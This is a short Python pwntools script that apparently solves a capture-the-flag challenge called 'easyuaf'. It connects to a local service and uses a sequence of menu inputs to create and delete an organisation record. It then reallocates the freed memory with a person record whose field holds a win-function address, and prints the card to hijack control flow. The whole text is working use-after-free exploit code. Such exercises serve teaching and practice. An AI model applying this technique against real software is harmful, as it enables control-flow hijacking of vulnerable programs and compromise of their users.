from pwn import *

# r = process("./easyuaf")
r = remote("localhost", 10525)

# new org
r.sendline(b"2")
r.sendline(b"2")    # id
r.sendline(b"2")    # name
r.sendline(b"2")    # style

# delete org
r.sendline(b"3")
r.sendline(b"2")    # id

# new person
WIN = 0x401276
r.sendline(b"1")
r.sendline(b"1")        # id
r.sendline(b"PWNED")    # name
r.sendline(b"0")        # age
r.sendline(str(WIN).encode())   # personal
r.sendline(b"0")                # business

# print card
r.sendline(b"4")
r.sendline(b"2")
r.sendline(b"1")

r.interactive()
